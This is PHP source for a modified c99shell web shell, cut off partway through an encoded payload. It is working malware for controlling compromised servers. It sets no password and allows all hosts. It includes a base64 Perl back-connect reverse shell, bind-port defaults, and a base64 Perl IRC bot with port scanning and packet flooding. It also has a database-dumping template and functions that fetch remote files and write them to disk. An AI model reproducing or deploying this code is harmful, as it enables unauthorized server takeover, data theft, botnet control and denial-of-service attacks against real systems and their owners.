<?php 
//Starting calls 
ini_set("max_execution_time",0); 
if (!function_exists("getmicrotime")) {function getmicrotime() {list($usec, $sec) = explode(" ", microtime()); return ((float)$usec + (float)$sec);}} 
error_reporting(5); 
$adires="http://psych0.kayyo.com/sploitz/httpd";
@ignore_user_abort(TRUE); 
@set_magic_quotes_runtime(0); 
$win = strtolower(substr(PHP_OS,0,3)) == "win"; 
define("starttime",getmicrotime()); 
if (get_magic_quotes_gpc()) {if (!function_exists("strips")) {function strips(&$arr,$k="") {if (is_array($arr)) {foreach($arr as $k=>$v) {if (strtoupper($k) != "GLOBALS") {strips($arr["$k"]);}}} else {$arr = stripslashes($arr);}}} strips($GLOBALS);} 
$_REQUEST = array_merge($_COOKIE,$_GET,$_POST); 
foreach($_REQUEST as $k=>$v) {if (!isset($$k)) {$$k = $v;}} 

$shver = "1.1"; //Current version 
//CONFIGURATION AND SETTINGS 
if (!empty($unset_surl)) {setcookie("c99sh_surl"); $surl = "";} 
elseif (!empty($set_surl)) {$surl = $set_surl; setcookie("c99sh_surl",$surl);} 
else {$surl = $_REQUEST["c99sh_surl"]; //Set this cookie for manual SURL 
} 

$surl_autofill_include = TRUE; //If TRUE then search variables with descriptors (URLs) and save it in SURL. 

if ($surl_autofill_include and !$_REQUEST["c99sh_surl"]) {$include = "&"; foreach (explode("&",getenv("QUERY_STRING")) as $v) {$v = explode("=",$v); $name = urldecode($v[0]); $value = urldecode($v[1]); foreach (array("http://","https://","ssl://","ftp://","\\\\") as $needle) {if (strpos($value,$needle) === 0) {$includestr .= urlencode($name)."=".urlencode($value)."&";}}} if ($_REQUEST["surl_autofill_include"]) {$includestr .= "surl_autofill_include=1&";}} 
if (empty($surl)) 
{ 
 $surl = "?".$includestr; //Self url 
} 
$surl = htmlspecialchars($surl); 

$timelimit = 0; //time limit of execution this script over server quote (seconds), 0 = unlimited. 

//Authentication 
$login = ""; //login 
//DON'T FORGOT ABOUT PASSWORD!!! 
$pass = ""; //password 
$md5_pass = ""; //md5-cryped pass. if null, md5($pass) 

$host_allow = array("*"); //array ("{mask}1","{mask}2",...), {mask} = IP or HOST e.g. array("192.168.0.*","127.0.0.1") 
$login_txt = "Restricted area"; //http-auth message. 
$accessdeniedmess = "<a href=\"http://ccteam.ru/releases/c99shell\">c99shell v.".$shver."</a>: access denied"; 

$gzipencode = TRUE; //Encode with gzip? 

$updatenow = FALSE; //If TRUE, update now (this variable will be FALSE) 

$c99sh_updateurl = "http://ccteam.ru/update/c99shell/"; //Update server 
$c99sh_sourcesurl = "http://ccteam.ru/files/c99sh_sources/"; //Sources-server 

$filestealth = TRUE; //if TRUE, don't change modify- and access-time 

$donated_html = "<center><b>C99 Modified By Psych0 </b></center>"; 
/* If you publish free shell and you wish 
add link to your site or any other information, 
put here your html. */ 
$donated_act = array(""); //array ("act1","act2,"...), if $act is in this array, display $donated_html. 

$curdir = "./"; //start folder 
//$curdir = getenv("DOCUMENT_ROOT"); 
$tmpdir = ""; //Folder for tempory files. If empty, auto-fill (/tmp or %WINDIR/temp) 
$tmpdir_log = "./"; //Directory logs of long processes (e.g. brute, scan...) 

$log_email = "user@host.tld"; //Default e-mail for sending logs 

$sort_default = "0a"; //Default sorting, 0 - number of colomn, "a"scending or "d"escending 
$sort_save = TRUE; //If TRUE then save sorting-position using cookies. 

// Registered file-types. 
//array( 
//"{action1}"=>array("ext1","ext2","ext3",...), 
//"{action2}"=>array("ext4","ext5","ext6",...), 
//... 
//) 
$ftypes= array( 
 "html"=>array("html","htm","shtml"), 
 "txt"=>array("txt","conf","bat","sh","js","bak","doc","log","sfc","cfg","htaccess"), 
 "exe"=>array("sh","install","bat","cmd"), 
 "ini"=>array("ini","inf"), 
 "code"=>array("php","phtml","php3","php4","inc","tcl","h","c","cpp","py","cgi","pl"), 
 "img"=>array("gif","png","jpeg","jfif","jpg","jpe","bmp","ico","tif","tiff","avi","mpg","mpeg"), 
 "sdb"=>array("sdb"), 
 "phpsess"=>array("sess"), 
 "download"=>array("exe","com","pif","src","lnk","zip","rar","gz","tar") 
); 

 $alici='

$dbismi="%s";
$server="%s";
$user="%s";
$pass="%s";
$veri_yolu = mysql_connect ("$server" , "$user" , "$pass" );

if ( ! $veri_yolu) die ("MySQL ile veri ba&#287;lant&#305;s&#305; kurulam&#305;yor!");
mysql_select_db( "$dbismi" , $veri_yolu ) or die ("Veritaban&#305; a&#231;&#305;lam&#305;yor!".mysql_error() );
$sonuc = mysql_query("SELECT * FROM %s");
while ($satir = mysql_fetch_row($sonuc)) {
$dolma.=$satir[%d]."</br>";
 }
 @ob_clean();
header("Content-type: application/force-download"); 
header("Content-length: ".strlen($dolma)); 
 header("Content-disposition: attachment; filename=\"Dump.php\";"); 
echo $dolma;
exit;

';

// Registered executable file-types. 
//array( 
//string "command{i}"=>array("ext1","ext2","ext3",...), 
//... 
//) 
//{command}: %f% = filename 
$dizin = str_replace("\\",DIRECTORY_SEPARATOR,$dizin); 
if (empty($dizin)) {$dizin = realpath(".");} elseif(realpath($dizin)) {$dizin = realpath($dizin);} 
$dizin = str_replace("\\",DIRECTORY_SEPARATOR,$dizin); 
if (substr($dizin,-1) != DIRECTORY_SEPARATOR) {$dizin .= DIRECTORY_SEPARATOR;} 
$dizin = str_replace("\\\\","\\",$dizin); 
$dizinispd = htmlspecialchars($dizin); 
/*dizin*/ 
$real = realpath($dizinispd); 
$path = basename ($PHP_SELF); 
function dosyayicek($link,$file) 
{ 
$fp = @fopen($link,"r"); 
while(!feof($fp)) 
{ 
 $cont.= fread($fp,1024); 
} 
fclose($fp); 

$fp2 = @fopen($file,"w"); 
fwrite($fp2,$cont); 
fclose($fp2); 
} 




$exeftypes= array( 
 getenv("PHPRC")." -q %f%" => array("php","php3","php4"), 
 "perl %f%" => array("pl","cgi") 
); 
function dosyicek($link) 
{ 
$fp = @fopen($link,"r"); 
while(!feof($fp)) 
{ 
 $cont.= fread($fp,1024); 
} 
fclose($fp); 

return $cont;
} 
/* Highlighted files. 
array( 
i=>array({regexp},{type},{opentag},{closetag},{break}) 
... 
) 
string {regexp} - regular exp. 
int {type}: 
0 - files and folders (as default), 
1 - files only, 2 - folders only 
string {opentag} - open html-tag, e.g. "<b>" (default) 
string {closetag} - close html-tag, e.g. "</b>" (default) 
bool {break} - if TRUE and found match then break 
*/ 

$regxp_highlight= array( 
array(basename($_SERVER["PHP_SELF"]),1,"<font color=\"yellow\">","</font>"), // example 
array("config.php",1),
array("config.inc.php",1),
array("Settings.php",1)

// example 
); 




$safemode_diskettes = array("a"); // This variable for disabling diskett-errors. 
 // array (i=>{letter} ...); string {letter} - letter of a drive 
//$safemode_diskettes = range("a","z"); 
$hexdump_lines = 8;// lines in hex preview file 
$hexdump_rows = 24;// 16, 24 or 32 bytes in one line 

$nixpwdperpage = 100; // Get first N lines from /etc/passwd 

$bindport_pass = "c99";// default password for binding 
$bindport_port = "31373"; // default port for binding 
$bc_port = "31373"; // default port for back-connect 
$datapipe_localport = "8081"; // default port for datapipe 
$back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj 
aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR 
hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT 
sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI 
kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi 
KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl 
OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw=="; 
$irc_connect="bXkgXCRwcm9jZXNzbyA9ICcvdXNyL2xvY2FsL2FwYWNoZS9iaW4vaHR0cGQgLURTU0wnOyAjIE5vbSBEdSBQcm9jZXNzdXMgIyANCm15IFwkbGluYXNfbWF4PSc0OCc7ICMgUG91ciBFdml0ZXIgbGUgRmxvb2QNCm15IFwkc2xlZXA9JzQnOyANCiMjIENvbmZpZ3VyYXRpb24gOg0KbXkgQGFkbXM9KFwiJGlyY2FkbWluXCIpOyAjIEFkbWluaXN0cmF0b3IgTmlja25hbWUjIA0KbXkgQGNhbmFpcz0oXCIkaXJjY2hhblwiKTsgIyBJcmMgQ2hhbm5lbCAgIyANCm15IFwkbmljaz0nJGlyY2xhYmVsJzsgIyBCb3QgTmlja25hbWUgIyANCm15IFwkaXJjbmFtZSA9ICckaXJjaWQnOyAjIFVzZXIgSUQgIyANCm15IFwkcmVhbG5hbWUgPSAnJGlyY25pY2snOyAjIEZ1bGwgTmFtZSAjIA0KXCRzZXJ2aWRvcj0nJGlyY3NlcnZlcicgdW5sZXNzIFwkc2Vydmlkb3I7ICMgSVJDIFNlcnZlciAjIA0KbXkgXCRwb3J0YT0nNjY2Nyc7ICMgSVJDIFBvcnQgIyANCm15IFwkc2VjdiA9IDE7ICMgMS8wIFNoZWxsIEFjY2Vzcw0KDQpteSBcJFZFUlNBTyA9ICcwLjInOyANClwkU0lHeydJTlQnfSA9ICdJR05PUkUnOyANClwkU0lHeydIVVAnfSA9ICdJR05PUkUnOyANClwkU0lHeydURVJNJ30gPSAnSUdOT1JFJzsgDQpcJFNJR3snQ0hMRCd9ID0gJ0lHTk9SRSc7IA0KXCRTSUd7J1BTJ30gPSAnSUdOT1JFJzsgDQpcJFNJR3snU3RvcCd9ID0gJ0lHTk9SRSc7DQp1c2UgSU86OlNvY2tldDsgDQp1c2UgU29ja2V0OyANCnVzZSBJTzo6U2VsZWN0OyANCmNoZGlyKFwiL1wiKTsgDQpcJHNlcnZpZG9yPVwiXCRBUkdWWzBdXCIgaWYgXCRBUkdWWzBdOyANCiQwPVwiXCRwcm9jZXNzb1wiLlwiXDBcIngxNjs7DQpteSBcJHBpZD1mb3JrOyANCmV4aXQgaWYgXCRwaWQ7IA0KZGllIFwiUHJvYmxlbWEgY29tIG8gZm9yazogJCFcIiB1bmxlc3MgZGVmaW5lZChcJHBpZCk7IA0KbXkgXCRkY2Nfc2VsID0gbmV3IElPOjpTZWxlY3QtPm5ldygpOyANCg0KXCRzZWxfY2xpZW50ZSA9IElPOjpTZWxlY3QtPm5ldygpOyANCnN1YiBzZW5kcmF3IHsgDQogIGlmICgkI18gPT0gJzEnKSB7IA0KICAgIG15IFwkc29ja2V0ID0gXCRfWzBdOyANCiAgICBwcmludCBcJHNvY2tldCBcIlwkX1sxXVxcblwiOyANCiAgfSBlbHNlIHsgDQogICAgICBwcmludCBcJElSQ19jdXJfc29ja2V0IFwiXCRfWzBdXFxuXCI7IA0KICB9IA0KfSANCg0Kc3ViIGNvbmVjdGFyIHsgDQogICBteSBcJG1ldW5pY2sgPSBcJF9bMF07IA0KICAgbXkgXCRzZXJ2aWRvcl9jb24gPSBcJF9bMV07IA0KICAgbXkgXCRwb3J0YV9jb24gPSBcJF9bMl07IA0KDQogICBteSBcJElSQ19zb2NrZXQgPSBJTzo6U29ja2V0OjpJTkVULT5uZXcoUHJvdG89PlwidGNwXCIsIFBlZXJBZGRyPT5cIlwkc2Vydmlkb3JfY29uXCIsIFBlZXJQb3J0PT5cJHBvcnRhX2Nvbikgb3IgcmV0dXJuKDEpOyANCiAgIGlmIChkZWZpbmVkKFwkSVJDX3NvY2tldCkpIHsgDQogICAgIFwkSVJDX2N1cl9zb2NrZXQgPSBcJElSQ19zb2NrZXQ7IA0KDQogICAgIFwkSVJDX3NvY2tldC0+YXV0b2ZsdXNoKDEpOyANCiAgICAgXCRzZWxfY2xpZW50ZS0+YWRkKFwkSVJDX3NvY2tldCk7IA0KDQogICAgIFwkaXJjX3NlcnZlcnN7XCRJUkNfY3VyX3NvY2tldH17J2hvc3QnfSA9IFwiXCRzZXJ2aWRvcl9jb25cIjsgDQogICAgIFwkaXJjX3NlcnZlcnN7XCRJUkNfY3VyX3NvY2tldH17J3BvcnRhJ30gPSBcIlwkcG9ydGFfY29uXCI7IA0KICAgICBcJGlyY19zZXJ2ZXJze1wkSVJDX2N1cl9zb2NrZXR9eyduaWNrJ30gPSBcJG1ldW5pY2s7IA0KICAgICBcJGlyY19zZXJ2ZXJze1wkSVJDX2N1cl9zb2NrZXR9eydtZXVpcCd9ID0gXCRJUkNfc29ja2V0LT5zb2NraG9zdDsgDQogICAgIG5pY2soXCJcJG1ldW5pY2tcIik7IA0KICAgICBzZW5kcmF3KFwiVVNFUiBcJGlyY25hbWUgXCIuXCRJUkNfc29ja2V0LT5zb2NraG9zdC5cIiBcJHNlcnZpZG9yX2NvbiA6XCRyZWFsbmFtZVwiKTsgDQogICAgIHNsZWVwIDE7IA0KICAgfSANCn0NCg0KbXkgXCRsaW5lX3RlbXA7IA0Kd2hpbGUoIDEgKSB7IA0KICAgd2hpbGUgKCEoa2V5cyglaXJjX3NlcnZlcnMpKSkgeyBjb25lY3RhcihcIlwkbmlja1wiLCBcIlwkc2Vydmlkb3JcIiwgXCJcJHBvcnRhXCIpOyB9IA0KICAgZGVsZXRlKFwkaXJjX3NlcnZlcnN7Jyd9KSBpZiAoZGVmaW5lZChcJGlyY19zZXJ2ZXJzeycnfSkpOyANCiAgICZEQ0M6OmNvbm5lY3Rpb25zOyANCiAgIG15IEByZWFkeSA9IFwkc2VsX2NsaWVudGUtPmNhbl9yZWFkKDApOyANCiAgIG5leHQgdW5sZXNzKEByZWFkeSk7IA0KICAgZm9yZWFjaCBcJGZoIChAcmVhZHkpIHsgDQogICAgIFwkSVJDX2N1cl9zb2NrZXQgPSBcJGZoOyANCiAgICAgXCRtZXVuaWNrID0gXCRpcmNfc2VydmVyc3tcJElSQ19jdXJfc29ja2V0fXsnbmljayd9OyANCiAgICAgXCRucmVhZCA9IHN5c3JlYWQoXCRmaCwgXCRtc2csIDQwOTYpOyANCiAgICAgaWYgKFwkbnJlYWQgPT0gMCkgeyANCiAgICAgICAgXCRzZWxfY2xpZW50ZS0+cmVtb3ZlKFwkZmgpOyANCiAgICAgICAgXCRmaC0+Y2xvc2U7IA0KICAgICAgICBkZWxldGUoXCRpcmNfc2VydmVyc3tcJGZofSk7IA0KICAgICB9IA0KICAgICBAbGluZXMgPSBzcGxpdCAoL1xcbi8sIFwkbXNnKTsgDQoNCiAgICAgZm9yKG15IFwkYz0wOyBcJGM8PSAkI2xpbmVzOyBcJGMrKykgeyANCiAgICAgICBcJGxpbmUgPSBcJGxpbmVzW1wkY107IA0KICAgICAgIFwkbGluZT1cJGxpbmVfdGVtcC5cJGxpbmUgaWYgKFwkbGluZV90ZW1wKTsgDQogICAgICAgXCRsaW5lX3RlbXA9Jyc7IA0KICAgICAgIFwkbGluZSA9fiBzL1xcciQvLzsgDQogICAgICAgdW5sZXNzIChcJGMgPT0gJCNsaW5lcykgeyANCiAgICAgICAgIHBhcnNlKFwiXCRsaW5lXCIpOyANCiAgICAgICB9IGVsc2UgeyANCiAgICAgICAgICAgaWYgKCQjbGluZXMgPT0gMCkgeyANCiAgICAgICAgICAgICBwYXJzZShcIlwkbGluZVwiKTsgDQogICAgICAgICAgIH0gZWxzaWYgKFwkbGluZXNbXCRjXSA9fiAvXFxyJC8pIHsgDQogICAgICAgICAgICAgICBwYXJzZShcIlwkbGluZVwiKTsgDQogICAgICAgICAgIH0gZWxzaWYgKFwkbGluZSA9fiAvXihcUyspIE5PVElDRSBBVVRIIDpcKlwqXCovKSB7IA0KICAgICAgICAgICAgICAgcGFyc2UoXCJcJGxpbmVcIik7IA0KICAgICAgICAgICB9IGVsc2UgeyANCiAgICAgICAgICAgICAgIFwkbGluZV90ZW1wID0gXCRsaW5lOyANCiAgICAgICAgICAgfSANCiAgICAgICB9IA0KICAgICAgfSANCiAgIH0gDQp9IA0KDQpzdWIgcGFyc2UgeyANCiAgIG15IFwkc2VydmFyZyA9IHNoaWZ0OyANCiAgIGlmIChcJHNlcnZhcmcgPX4gL15QSU5HIFw6KC4qKS8pIHsgDQogICAgIHNlbmRyYXcoXCJQT05HIDokMVwiKTsgDQogICB9IGVsc2lmIChcJHNlcnZhcmcgPX4gL15cOiguKz8pXCEoLis/KVxAKC4rPykgUFJJVk1TRyAoLis/KSBcOiguKykvKSB7IA0KICAgICAgIG15IFwkcG49JDE7IG15IFwkb25kZSA9ICQ0OyBteSBcJGFyZ3MgPSAkNTsgDQogICAgICAgaWYgKFwkYXJncyA9fiAvXlxcMDAxVkVSU0lPTlxcMDAxJC8pIHsgDQogICAgICAgICBub3RpY2UoXCJcJHBuXCIsIFwiXFwwMDFWRVJTSU9OIFNoZWxsQk9ULVwkVkVSU0FPIHBvciAwbGRXMGxmXFwwMDFcIik7IA0KICAgICAgIH0gDQogICAgICAgaWYgKGdyZXAge1wkXyA9fiAvXlxRXCRwblxFJC9pIH0gQGFkbXMpIHsgDQogICAgICAgICBpZiAoXCRvbmRlIGVxIFwiXCRtZXVuaWNrXCIpeyANCiAgICAgICAgICAgc2hlbGwoXCJcJHBuXCIsIFwiXCRhcmdzXCIpOyANCiAgICAgICAgIH0gDQogICAgICAgICBpZiAoXCRhcmdzID1+IC9eKFxRXCRtZXVuaWNrXEV8XCFhdHJpeClccysoLiopLyApIHsgDQogICAgICAgICAgICBteSBcJG5hdHJpeCA9ICQxOyANCiAgICAgICAgICAgIG15IFwkYXJnID0gJDI7IA0KICAgICAgICAgICAgaWYgKFwkYXJnID1+IC9eXCEoLiopLykgeyANCiAgICAgICAgICAgICAgaXJjYXNlKFwiXCRwblwiLFwiXCRvbmRlXCIsXCJcJDFcIikgdW5sZXNzIChcJG5hdHJpeCBlcSBcIiFhdHJpeFwiIGFuZCBcJGFyZyA9fiAvXlwhbmljay8pOyANCiAgICAgICAgICAgIH0gZWxzaWYgKFwkYXJnID1+IC9eXEAoLiopLykgeyANCiAgICAgICAgICAgICAgICBcJG9uZGVwID0gXCRvbmRlOyANCiAgICAgICAgICAgICAgICBcJG9uZGVwID0gXCRwbiBpZiBcJG9uZGUgZXEgXCRtZXVuaWNrOyANCiAgICAgICAgICAgICAgICBiZnVuYyhcIlwkb25kZXBcIixcIiQxXCIpOyANCiAgICAgICAgICAgIH0gZWxzZSB7IA0KICAgICAgICAgICAgICAgIHNoZWxsKFwiXCRvbmRlXCIsIFwiXCRhcmdcIik7IA0KICAgICAgICAgICAgfSANCiAgICAgICAgIH0gDQogICAgICAgfSANCiAgIH0gZWxzaWYgKFwkc2VydmFyZyA9fiAvXlw6KC4rPylcISguKz8pXEAoLis/KVxzK05JQ0tccytcOihcUyspL2kpIHsgDQogICAgICAgaWYgKGxjKCQxKSBlcSBsYyhcJG1ldW5pY2spKSB7IA0KICAgICAgICAgXCRtZXVuaWNrPSQ0OyANCiAgICAgICAgIFwkaXJjX3NlcnZlcnN7XCRJUkNfY3VyX3NvY2tldH17J25pY2snfSA9IFwkbWV1bmljazsgDQogICAgICAgfSANCiAgIH0gZWxzaWYgKFwkc2VydmFyZyA9fiBtL15cOiguKz8pXHMrNDMzL2kpIHsgDQogICAgICAgbmljayhcIlwkbWV1bmlja1wiLmludCByYW5kKDk5OTkpKTsgDQogICB9IGVsc2lmIChcJHNlcnZhcmcgPX4gbS9eXDooLis/KVxzKzAwMVxzKyhcUyspXHMvaSkgeyANCiAgICAgICBcJG1ldW5pY2sgPSAkMjsgDQogICAgICAgXCRpcmNfc2VydmVyc3tcJElSQ19jdXJfc29ja2V0fXsnbmljayd9ID0gXCRtZXVuaWNrOyANCiAgICAgICBcJGlyY19zZXJ2ZXJze1wkSVJDX2N1cl9zb2NrZXR9eydub21lJ30gPSBcIiQxXCI7IA0KICAgICAgIGZvcmVhY2ggbXkgXCRjYW5hbCAoQGNhbmFpcykgeyANCiAgICAgICAgIHNlbmRyYXcoXCJKT0lOIFwkY2FuYWxcIik7IA0KICAgICAgIH0gDQogICB9IA0KfSANCg0KDQpzdWIgYmZ1bmMgeyANCiAgbXkgXCRwcmludGwgPSBcJF9bMF07IA0KICBteSBcJGZ1bmNhcmcgPSBcJF9bMV07IA0KICBpZiAobXkgXCRwaWQgPSBmb3JrKSB7IA0KICAgICB3YWl0cGlkKFwkcGlkLCAwKTsgDQogIH0gZWxzZSB7IA0KICAgICAgaWYgKGZvcmspIHsgDQogICAgICAgICBleGl0OyANCiAgICAgICB9IGVsc2UgeyANCiAgICAgICAgICAgaWYgKFwkZnVuY2FyZyA9fiAvXnBvcnRzY2FuICguKikvKSB7IA0KICAgICAgICAgICAgIG15IFwkaG9zdGlwPVwiJDFcIjsgDQogICAgICAgICAgICAgbXkgQHBvcnRhcz0oXCIyMVwiLFwiMjJcIixcIjIzXCIsXCIyNVwiLFwiNTNcIixcIjgwXCIsXCIxMTBcIixcIjE0M1wiKTsgDQogICAgICAgICAgICAgbXkgKEBhYmVydGEsICVwb3J0YV9iYW5uZXIpOyANCiAgICAgICAgICAgICBmb3JlYWNoIG15IFwkcG9ydGEgKEBwb3J0YXMpIHsgDQogICAgICAgICAgICAgICAgbXkgXCRzY2Fuc29jayA9IElPOjpTb2NrZXQ6OklORVQtPm5ldyhQZWVyQWRkciA9PiBcJGhvc3RpcCwgUGVlclBvcnQgPT4gXCRwb3J0YSwgUHJvdG8gPT4gJ3RjcCcsIFRpbWVvdXQgPT4gNCk7IA0KICAgICAgICAgICAgICAgIGlmIChcJHNjYW5zb2NrKSB7IA0KICAgICAgICAgICAgICAgICAgIHB1c2ggKEBhYmVydGEsIFwkcG9ydGEpOyANCiAgICAgICAgICAgICAgICAgICBcJHNjYW5zb2NrLT5jbG9zZTsgDQogICAgICAgICAgICAgICAgfSANCiAgICAgICAgICAgICB9IA0KDQogICAgICAgICAgICAgaWYgKEBhYmVydGEpIHsgDQogICAgICAgICAgICAgICBzZW5kcmF3KFwkSVJDX2N1cl9zb2NrZXQsIFwiUFJJVk1TRyBcJHByaW50bCA6cG9ydGFzIGFiZXJ0YXM6IEBhYmVydGFcIik7IA0KICAgICAgICAgICAgIH0gZWxzZSB7IA0KICAgICAgICAgICAgICAgICBzZW5kcmF3KFwkSVJDX2N1cl9zb2NrZXQsXCJQUklWTVNHIFwkcHJpbnRsIDpOZW5odW1hIHBvcnRhIGFiZXJ0YSBmb2kgZW5jb250cmFkYVwiKTsgDQogICAgICAgICAgICAgfSANCiAgICAgICAgICAgfSANCiAgICAgICAgICAgaWYgKFwkZnVuY2FyZyA9fiAvXnBhY290YVxzKyguKilccysoXGQrKVxzKyhcZCspLykgeyANCiAgICAgICAgICAgICBteSAoXCRkdGltZSwgJXBhY290ZXMpID0gYXR0YWNrZXIoXCIkMVwiLCBcIiQyXCIsIFwiJDNcIik7IA0KICAgICAgICAgICAgIFwkZHRpbWUgPSAxIGlmIFwkZHRpbWUgPT0gMDsgDQogICAgICAgICAgICAgbXkgJWJ5dGVzOyANCiAgICAgICAgICAgICBcJGJ5dGVze2lnbXB9ID0gJDIgKiBcJHBhY290ZXN7aWdtcH07IA0KICAgICAgICAgICAgIFwkYnl0ZXN7aWNtcH0gPSAkMiAqIFwkcGFjb3Rlc3tpY21wfTsgDQogICAgICAgICAgICAgXCRieXRlc3tvfSA9ICQyICogXCRwYWNvdGVze299OyANCiAgICAgICAgICAgICBcJGJ5dGVze3VkcH0gPSAkMiAqIFwkcGFjb3Rlc3t1ZHB9OyANCiAgICAgICAgICAgICBcJGJ5dGVze3RjcH0gPSAkMiAqIFwkcGFjb3Rlc3t0Y3B9OyANCiAgICAgICAgICAgICANCiAgICAgICAgICAgICBzZW5kcmF3KFwkSVJDX2N1cl9zb2NrZXQsIFwiUFJJVk1TRyBcJHByaW50bCA6XFwwMDIgLSBTdGF0dXMgR0VSQUwgLVxcMDAyXCIpOyANCiAgICAgICAgICAgICBzZW5kcmF3KFwkSVJDX2N1cl9zb2NrZXQsIFwiUFJJVk1TRyBcJHByaW50bCA6XFwwMDJUZW1wb1xcMDAyOiBcJGR0aW1lXCIuXCJzXCIpOyANCiAgICAgICAgICAgICBzZW5kcmF3KFwkSVJDX2N1cl9zb2NrZXQsIFwiUFJJVk1TRyBcJHByaW50bCA6XFwwMDJUb3RhbCBwYWNvdGVzXFwwMDI6IFwiLihcJHBhY290ZXN7dWRwfSArIFwkcGFjb3Rlc3tpZ21wfSArIFwkcGFjb3Rlc3tpY21wfSArIFwkcGFjb3Rlc3tvfSkpOyANCiAgICAgICAgICAgICBzZW5kcmF3KFwkSVJDX2N1cl9zb2NrZXQsIFwiUFJJVk1TRyBcJHByaW50bCA6XFwwMDJUb3RhbCBieXRlc1xcMDAyOiBcIi4oXCRieXRlc3tpY21wfSArIFwkYnl0ZXMge2lnbXB9ICsgXCRieXRlc3t1ZHB9ICsgXCRieXRlc3tvfSkpOyANCiAgICAgICAgICAgICBzZW5kcmF3KFwkSVJDX2N1cl9zb2NrZXQsIFwiUFJJVk1TRyBcJHByaW50bCA6XFwwMDJNJiMyMzM7ZGlhIGRlIGVudmlvXFwwMDI6IFwiLmludCgoKFwkYnl0ZXN7aWNtcH0rXCRieXRlc3tpZ21wfStcJGJ5dGVze3VkcH0gKyBcJGJ5dGVze299KS8xMDI0KS9cJGR0aW1lKS5cIiBrYnBzXCIpOyANCg0KICAgICAgICAgICB9IA0KICAgICAgICAgICBleGl0OyANCiAgICAgICB9IA0KICB9IA0KfSANCg0Kc3ViIGlyY2FzZSB7IA0KICBteSAoXCRrZW0sIFwkcHJpbnRsLCBcJGNhc2UpID0gQF87IA0KDQoNCiAgaWYgKFwkY2FzZSA9fiAvXmpvaW4gKC4qKS8pIHsgDQogICAgIGooXCIkMVwiKTsgDQogICB9IA0KICAgaWYgKFwkY2FzZSA9fiAvXnBhcnQgKC4qKS8pIHsgDQogICAgICBwKFwiJDFcIik7IA0KICAgfSANCiAgIGlmIChcJGNhc2UgPX4gL15yZWpvaW5ccysoLiopLykgeyANCiAgICAgIG15IFwkY2hhbiA9ICQxOyANCiAgICAgIGlmIChcJGNoYW4gPX4gL14oXGQrKSAoLiopLykgeyANCiAgICAgICAgZm9yIChteSBcJGNhID0gMTsgXCRjYSA8PSAkMTsgXCRjYSsrICkgeyANCiAgICAgICAgICBwKFwiJDJcIik7IA0KICAgICAgICAgIGooXCIkMlwiKTsgDQogICAgICAgIH0gDQogICAgICB9IGVsc2UgeyANCiAgICAgICAgICBwKFwiXCRjaGFuXCIpOyANCiAgICAgICAgICBqKFwiXCRjaGFuXCIpOyANCiAgICAgIH0gDQogICB9IA0KICAgaWYgKFwkY2FzZSA9fiAvXm9wLykgeyANCiAgICAgIG9wKFwiXCRwcmludGxcIiwgXCJcJGtlbVwiKSBpZiBcJGNhc2UgZXEgXCJvcFwiOyANCiAgICAgIG15IFwkb2FyZyA9IHN1YnN0cihcJGNhc2UsIDMpOyANCiAgICAgIG9wKFwiJDFcIiwgXCIkMlwiKSBpZiAoXCRvYXJnID1+IC8oXFMrKVxzKyhcUyspLyk7IA0KICAgfSANCiAgIGlmIChcJGNhc2UgPX4gL15kZW9wLykgeyANCiAgICAgIGRlb3AoXCJcJHByaW50bFwiLCBcIlwka2VtXCIpIGlmIFwkY2FzZSBlcSBcImRlb3BcIjsgDQogICAgICBteSBcJG9hcmcgPSBzdWJzdHIoXCRjYXNlLCA1KTsgDQogICAgICBkZW9wKFwiJDFcIiwgXCIkMlwiKSBpZiAoXCRvYXJnID1+IC8oXFMrKVxzKyhcUyspLyk7IA0KICAgfSANCiAgIGlmIChcJGNhc2UgPX4gL152b2ljZS8pIHsgDQogICAgICB2b2ljZShcIlwkcHJpbnRsXCIsIFwiXCRrZW1cIikgaWYgXCRjYXNlIGVxIFwidm9pY2VcIjsgDQogICAgICBcJG9hcmcgPSBzdWJzdHIoXCRjYXNlLCA2KTsgDQogICAgICB2b2ljZShcIiQxXCIsIFwiJDJcIikgaWYgKFwkb2FyZyA9fiAvKFxTKylccysoXFMrKS8pOyANCiAgIH0gDQogICBpZiAoXCRjYXNlID1+IC9eZGV2b2ljZS8pIHsgDQogICAgICBkZXZvaWNlKFwiXCRwcmludGxcIiwgXCJcJGtlbVwiKSBpZiBcJGNhc2UgZXEgXCJkZXZvaWNlXCI7IA0KICAgICAgXCRvYXJnID0gc3Vic3RyKFwkY2FzZSwgOCk7IA0KICAgICAgZGV2b2ljZShcIiQxXCIsIFwiJDJcIikgaWYgKFwkb2FyZyA9fiAvKFxTKylccysoXFMrKS8pOyANCiAgIH0gDQogICBpZiAoXCRjYXNlID1+IC9ebXNnXHMrKFxTKykgKC4qKS8pIHsgDQogICAgICBtc2coXCIkMVwiLCBcIiQyXCIpOyANCiAgIH0gDQogICBpZiAoXCRjYXNlID1+IC9eZmxvb2RccysoXGQrKVxzKyhcUyspICguKikvKSB7IA0KICAgICAgZm9yIChteSBcJGNmID0gMTsgXCRjZiA8PSAkMTsgXCRjZisrKSB7IA0KICAgICAgICBtc2coXCIkMlwiLCBcIiQzXCIpOyANCiAgICAgIH0gDQogICB9IA0KICAgaWYgKFwkY2FzZSA9fiAvXmN0Y3BccysoXFMrKSAoLiopLykgeyANCiAgICAgIGN0